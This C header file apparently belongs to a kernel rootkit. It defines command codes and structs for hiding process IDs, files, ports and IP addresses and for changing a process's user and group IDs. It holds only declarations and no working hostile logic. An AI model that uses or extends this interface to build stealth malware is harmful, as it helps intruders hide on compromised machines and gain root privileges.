#define HIDE_PID		1
#define UNHIDE_PID	2
#define HIDE_FILE		3
#define UNHIDE_FILE	4
#define HIDE_PORT		5
#define UNHIDE_PORT	6
#define HIDE_IP		7
#define UNHIDE_IP		8
#define GET_PIDS		9
#define GET_FILES		10
#define CHANGE_UID	11
#define CHANGE_EUID	12
#define CHANGE_GID	13
#define CHANGE_EGID	14

#define FOUND 1
#define NOTFOUND 0

#define NAMELEN 256

struct u2k_args
{	int action;
	void *buff;
};

struct pid_output
{	int found;
	int pid;
};

struct file_output
{	int found;
	char filename[NAMELEN];
};

struct protected_hosts
{	u_int ip;
	struct protected_hosts *next;
};

struct protected_ports
{	u_short port;
	struct protected_ports *next;
};

struct protected_pids
{	int pid;
	struct protected_pids *next;
};

struct hidden_files
{	char filename[256];
	struct hidden_files *next;
};

struct change_priv
{	int owner;
	int pid;
};
